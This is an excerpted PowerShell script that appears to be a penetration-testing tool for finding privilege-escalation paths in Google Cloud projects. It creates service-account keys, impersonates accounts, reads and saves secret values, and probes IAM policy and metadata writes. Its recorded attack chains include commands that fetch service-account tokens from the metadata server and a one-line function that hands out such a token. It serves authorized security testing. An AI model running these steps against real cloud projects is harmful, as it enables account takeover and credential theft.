...
# Test module names (for progress bar)
$Script:TestModules = @(
    "Permission Probe",
    "SA Key Creation",
    "SA Impersonation",
...
function Update-TestProgress {
    <#
    .DESCRIPTION
        Two-tier progress bar for the tester:
          ID 0 — Overall project progress
          ID 1 — Test module progress within current project
    #>
    param(
        [int]$ProjectIndex,
        [int]$ProjectTotal,
    ...
    $projectPct = [math]::Round(($ProjectIndex / [math]::Max($ProjectTotal,1)) * 100)
    $elapsed    = if ($Script:StartTime) { (Get-Date) - $Script:StartTime } else { [timespan]::Zero }
    $rate       = if ($ProjectIndex -gt 0) { $elapsed.TotalSeconds / $ProjectIndex } else { 0 }
    $remaining  = [math]::Round(($ProjectTotal - $ProjectIndex) * $rate)
    $eta        = if ($remaining -gt 0) { "ETA ~$([math]::Floor($remaining/60))m $($remaining%60)s" } else { "" }

    Write-Progress -Id 0 `
        -Activity "PrivEsc Testing [$ProjectIndex/$ProjectTotal] $eta" `
        -Status   "Project: $ProjectName ($projectPct%)" `
        -PercentComplete $projectPct

    if ($ModuleIndex -ge 0) {
        $modulePct = [math]::Round((($ModuleIndex + 1) / $Script:TestModules.Count) * 100)
        Write-Progress -Id 1 -ParentId 0 `
            -Activity "  Test [$($ModuleIndex+1)/$($Script:TestModules.Count)]" `
            -Status   "$ModuleName" `
            -PercentComplete $modulePct
    }
}

function Complete-TestProjectProgress {
    Write-Progress -Id 1 -ParentId 0 -Activity "Done" -Completed
}

function Complete-AllTestProgress {
...
# ---------- Permission testing ----------
# Uses `gcloud iam list-testable-permissions` where possible, and falls back
# to targeted command probes for permissions the API doesn't cover.

function Test-Permission {
    <#
    .DESCRIPTION
        Returns $true if the current identity has the given IAM permission
        on the specified resource.  Uses the projects.testIamPermissions API
        via gcloud for project-level permissions, or targeted probes for
    ...
    # Check cache first
    if ($Script:PermCache.ContainsKey($Project)) {
        if ($Script:PermCache[$Project].ContainsKey($Permission)) {
            return $Script:PermCache[$Project][$Permission]
        }
    } else {
        $Script:PermCache[$Project] = @{}
    }

    # Batch test via API: gcloud projects test-iam-permissions
    # (not available directly; we simulate by trying the action)
    # gcloud asset analyze-iam-policy is another option but needs Cloud Asset API.
    # Fallback: direct probe of the action.

    $result = $false
    # We'll cache and return
    $Script:PermCache[$Project][$Permission] = $result
    return $result   # default false; individual tests override
}
...
function Test-PermissionBatch {
    ...
    # --- setIamPolicy: inferred from getIamPolicy + role analysis ---
    # We check if our identity is bound to roles that include setIamPolicy
    # (actual write test is in Aggressive mode only)
...
function Test-SAKeyCreation {
    ...
    foreach ($sa in $SAs) {
        ...
        if ($Mode -eq "Probe") {
            # In Probe mode, check if our roles on the project include the permission
            # by examining IAM bindings (no active test)
        ...
        if ($r.success -and (Test-Path $keyFile)) {
            ...
            # Determine what this SA can do (its roles on the project)
            $saRoles = Get-SARolesOnProject -SAEmail $saEmail -Project $Project
            $rolesStr = if ($saRoles) { $saRoles -join ", " } else { "(unknown - enumerate with activated key)" }
...
function Test-SAKeyCreateFromBindings {
    ...
    # Check if the caller's roles include iam.serviceAccountKeys.create
    # by examining known role -> permission mappings
    $keyCreateRoles = @(
        "roles/owner",
        "roles/editor",
...
function Test-SAImpersonation {
    ...
    foreach ($sa in $SAs) {
        ...
        if ($r.success -and $r.stdout -match "^ya29\.") {
            ...
            $saRoles = Get-SARolesOnProject -SAEmail $saEmail -Project $Project
            $rolesStr = if ($saRoles) { $saRoles -join ", " } else { "(enumerate with token)" }
            $isDefault = $saEmail -match "\d+-compute@developer|@appspot\.gserviceaccount|@cloudbuild\.gserviceaccount"
            $severity = if ($isDefault -or $saRoles -match "owner|editor|admin") { "CRITICAL" } else { "HIGH" }
        ...
        $testPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("pentest-probe"))
...
function Test-IAMPolicyModification {
            ...
            foreach ($cr in $projData.custom_roles) {
                ...
                if (Test-Path $crFile) {
                    ...
                    if ($crData.includedPermissions -contains "resourcemanager.projects.setIamPolicy") {
                        # Check if caller is bound to this custom role
                        foreach ($binding in $policy.bindings) {
    ...
    if ($hasPotentialSetIam) {
        ...
        if ($Mode -eq "Aggressive") {
            # Actually test by adding a harmless binding and immediately removing it
            Write-Log "    [AGGRESSIVE] Testing actual setIamPolicy write..." "WARN"

            # Save current etag
            $etag = $policy.etag

            # We'll add a binding for a non-existent test role to prove write access
            # then immediately revert. Use the viewer role for safety.
            $testBinding = @{
                role    = "roles/browser"
                members = @("serviceAccount:pentest-probe-nonexistent@$Project.iam.gserviceaccount.com")
            }

            # Export, modify, apply, revert
            $tempPolicyFile = "$dir\test_policy_write.json"
            $policy | ConvertTo-Json -Depth 20 | Set-Content $tempPolicyFile

            # Try setting the UNMODIFIED policy (same etag) — this proves write access
            ...
            if ($r.success) {
                ...
                Record-Chain -ChainID $chainID -Project $Project `
                    ...
                    -Severity "CRITICAL" `
                    -InitialAccess "Current identity has $matchedRole which includes resourcemanager.projects.setIamPolicy" `
                ...
                Write-Proof "[SETIAMPOLICY-$Project] setIamPolicy confirmed via role $matchedRole`n"
            } else {
        ...
        if ($Mode -ne "Aggressive") {
            ...
            if ($canUpdate) {
                ...
                Record-Chain -ChainID $chainID -Project $Project `
                    ...
                    -TargetPrivilege "Can add any permission (e.g., setIamPolicy, actAs) to custom role $roleName" `
                    -Steps @(
            ...
            # Aggressive: try to describe with update flag (dry run)
            $r = Run-GcloudRaw "iam roles describe $roleName --project=$Project --format=json"
            if ($r.success) {
                Write-Log "    Role readable; would need iam.roles.update to escalate" "OK"
            }
        }
    }
}
    ...
    foreach ($inst in $Instances) {
        ...
        if ($Mode -eq "Aggressive") {
            ...
            if ($r) {
                ...
                # Test: try adding a metadata key-value pair (harmless probe key)
                ...
                if ($testR.success) {
                    ...
                    $saContext = if ($instSA) { "Instance runs as SA: $instSA" } else { "No SA attached" }
            ...
            # Probe/Safe: note potential based on role analysis
            Write-Log "    Skipping active metadata test on $name ($Mode mode)" "TEST"
        }
    }

    # --- Test: Project-wide metadata (SSH keys for ALL instances) ---
    if ($Mode -eq "Aggressive") {
        Write-Log "  [COMPUTE] Testing project-wide setCommonInstanceMetadata..." "WARN"
        $r = Run-GcloudRaw "compute project-info describe --project=$Project --format=json"
        if ($r.success) {
            # Try adding a project-wide metadata key
        ...
        if ($targetSA) {
            ...
            if ($r.success) {
                ...
                Record-Chain -ChainID $chainID -Project $Project `
                    ...
                    -TargetPrivilege "Code execution as $targetSA with full cloud-platform scope" `
                    -Steps @(
                    ...
                    -Impact "Full code execution as $targetSA. If SA has Editor/Owner, this is complete project compromise."
...
function Test-ServerlessAbuse {
    ...
    # --- Cloud Functions: update existing function to exfil SA token ---
    if ($Functions -and $Functions.Count -gt 0 -and $Mode -eq "Aggressive") {
        foreach ($fn in $Functions) {
            ...
            # We test by trying to describe with update intent
            # Full aggressive mode would deploy a token-exfil function
            $r = Run-GcloudRaw "functions describe $fnShort --region=$fnRegion --project=$Project --format=json"
            if ($r.success) {
                # Check if we can update by trying to set an env var
                ...
                if ($testR.success) {
                    ...
                    Record-Chain -ChainID $chainID -Project $Project `
                        ...
                        -TargetPrivilege "Arbitrary code execution as $fnSA" `
                        -Steps @(
                        ...
                        -Commands @(
                            "# Create malicious function source",
                            "# (function that outputs its SA token when invoked)",
                            "",
                        ...
                        -Impact "Code execution as $fnSA. Function already has network access and SA credentials."
    ...
    # --- Cloud Functions: test new function deployment ---
    if ($Mode -eq "Aggressive" -and $SAs.Count -gt 0) {
        $targetSA = ($SAs | Where-Object { $_.is_default } | Select-Object -First 1).email
        if (-not $targetSA) { $targetSA = $SAs[0].email }

        if ($targetSA) {
            # Check if cloudfunctions API is enabled
            $projData = $Script:Manifest.projects[$Project]
            $cfEnabled = $projData -and ($projData.enabled_apis -contains "cloudfunctions.googleapis.com")

            if ($cfEnabled) {
                Write-Log "    Testing new function deployment as $targetSA..." "WARN"
                # We won't actually deploy (too intrusive even for aggressive), but record the path
                $chainID = "FUNC-CREATE-$Project"
                # Just test permissions conceptually by checking roles
                $callerRoles = @()
                foreach ($binding in $projData.iam_bindings) {
                    foreach ($m in $binding.members) {
                ...
                if ($canCreate) {
                    Record-Chain -ChainID $chainID -Project $Project `
                        ...
                        -Severity "HIGH" `
                        -InitialAccess "Current identity has cloudfunctions.functions.create via $($canCreate -join ', ')" `
                        -TargetPrivilege "Deploy function as $targetSA for code execution" `
                        -Steps @(
                            "Current identity has function creation capability",
                        ...
                        -Commands @(
                            "# Create function source (e.g., Python)",
                            "mkdir probe_fn && echo 'import json,urllib.request; handler=lambda req: urllib.request.urlopen(urllib.request.Request(`"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`",headers={`"Metadata-Flavor`":`"Google`"})).read()' > probe_fn/main.py",
                            "",
                        ...
                        -Impact "Arbitrary code execution as $targetSA. Combined with actAs, this chains to the SA's full privileges."
                }
            }
        }
    }

    # --- Cloud Run: similar pattern ---
    if ($RunServices -and $RunServices.Count -gt 0) {
        foreach ($svc in $RunServices) {
            $svcSA = $svc.sa
            if ($svcSA) {
                Write-Log "    Cloud Run service $($svc.name) runs as $svcSA (noted for chain building)" "TEST"
            }
        }
    }
}
...
function Test-CloudBuildAbuse {
    ...
    # Test if we can submit builds
    if ($Mode -ne "Probe") {
        # Create a minimal build config that just echoes (no side effects)
        $buildConfig = @{
            steps = @(
                @{
        ...
        if ($Mode -eq "Aggressive") {
            ...
            if ($r.success) {
                ...
                $projNum = ""
                # Try to get project number from an instance or other source
                ...
                Record-Chain -ChainID $chainID -Project $Project `
                    ...
                    -TargetPrivilege "Arbitrary command execution as Cloud Build SA ($cbSA) — typically has Editor + actAs on all SAs" `
                    -Steps @(
                        "Build submission confirmed on project $Project",
                        "Cloud Build SA ($cbSA) typically has roles/editor + iam.serviceAccounts.actAs",
                    ...
                    -Commands @(
                        ...
                        "#       - -c",
                        "#       - |",
                        "#         # Get the Cloud Build SA token",
                        "#         curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "#         # Or directly escalate:",
            ...
            # Safe mode: just check if we can list builds (implies some access)
    ...
    # Check build triggers for default SA usage
    if ($BuildTriggers) {
...
function Test-SecretAccess {
    ...
    foreach ($secret in $Secrets) {
        ...
        if ($r.success) {
            ...
            # Save full value to file (for pentest evidence)
        ...
        if ($canRead -or $canWrite) {
            ...
            Record-Chain -ChainID $chainID -Project $Project `
                ...
                -Commands @(
                    ...
                    "",
                    "$(if ($canWrite) { "# Write test`ngsutil cp payload.txt gs://$bucket/payload.txt" })"
                ) `
    ...
    foreach ($ds in $Datasets) {
        ...
        try {
            ...
            if (-not ($tablesErr -match "Access Denied|403") -and $tablesOut) {
                ...
                # Try a sample query on the first table
                $sampleTable = $null
                $sampleResult = ""
...
function Test-DelegationChains {
    ...
    foreach ($sa in $SAs) {
        $saEmail = $sa.email
        # Read the SA-level IAM policy from the enumeration output
    ...
    foreach ($targetSA in $graph.Keys) {
        ...
        foreach ($source in $graph[$targetSA]) {
            ...
            # Check if source is itself an SA that someone else can impersonate
            ...
            if ($graph.ContainsKey($sourceEmail)) {
                ...
                foreach ($hop2Source in $graph[$sourceEmail]) {
                    ...
                    Record-Chain -ChainID $chainID -Project $Project `
                        ...
                        -InitialAccess "$($hop2Source.member) can impersonate $sourceEmail via $($hop2Source.role)" `
                        -TargetPrivilege "Chain: $($hop2Source.member) -> $sourceEmail -> $targetSA (roles: $($targetRoles -join ', '))" `
                        -Steps @(
                            "Hop 1: $($hop2Source.member) has $($hop2Source.role) on $sourceEmail",
                            "Hop 2: $sourceMember has $($source.role) on $targetSA",
                            "Target SA roles: $($targetRoles -join ', ')",
                        ...
                        -Impact "Multi-hop privilege escalation via SA delegation chain. $(if ($targetIsPriv) { 'Target SA has elevated privileges!' })"
                }
            }
            ...
            if ($sourceMember -match [regex]::Escape($Script:Manifest.caller_account)) {
                ...
                Record-Chain -ChainID $chainID -Project $Project `
                    ...
                    -InitialAccess "Current identity ($sourceMember) has $($source.role) on $targetSA" `
                    -TargetPrivilege "Direct impersonation of $targetSA (roles: $($targetRoles -join ', '))" `
                    -Steps @(
                        "Current identity is granted $($source.role) on $targetSA",
                    ...
                    -Impact "Direct SA impersonation. $(if ($targetIsPriv) { "Target SA has: $($targetRoles -join ', ') — this is a significant escalation." })"
            }
        }
    }
}
...
function Test-CrossProjectChains {
    ...
    # Build a global SA -> projects map
    $saToProjects = @{}   # sa_email -> @(projects)
    $saToRoles = @{}      # sa_email::project -> @(roles)
    ...
    $chainNum = 0
    # Find SAs that span multiple projects
    foreach ($saEmail in $saToProjects.Keys) {
        $projects = $saToProjects[$saEmail] | Select-Object -Unique
        if ($projects.Count -gt 1) {
            # This SA exists in multiple projects — cross-project pivot potential
            $rolesByProject = @{}
    ...
    # Check for default compute SAs with Editor that span projects
...
$projIndex = 0
$targetProjectArray = @($targetProjectList)   # ensure it's an array for .Count
$totalTargets = $targetProjectArray.Count

foreach ($projName in $targetProjectArray) {
    $projIndex++
    ...
    Update-TestProgress -ProjectIndex $projIndex -ProjectTotal $totalTargets -ProjectName $projName

    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Yellow
    Write-Host "  [$projIndex/$totalTargets] TESTING: $projName" -ForegroundColor Yellow
    Write-Host "================================================================" -ForegroundColor Yellow
    ...
    # ---- Run all test modules with progress tracking ----
    $mi = 0

    Update-TestProgress $projIndex $totalTargets $projName $mi $Script:TestModules[$mi]
    $perms = Test-PermissionBatch -Project $projName
    Save-Output "$projDir\permissions_probe.json" $perms
    Write-Log "  Permission probe complete" "INFO"
    ...
    Complete-TestProjectProgress
    Write-Log "[$projIndex/$totalTargets] COMPLETE: $projName" "INFO"
}

Complete-AllTestProgress

# ---- Phase 2: Cross-Project Analysis ----
# Re-create the manifest projects reference for cross-project analysis
...
Write-Host ""
Write-Host "  Elapsed Time          : $elapsedStr" -ForegroundColor White
Write-Host "  Projects Tested       : $totalTargets" -ForegroundColor White
Write-Host ""
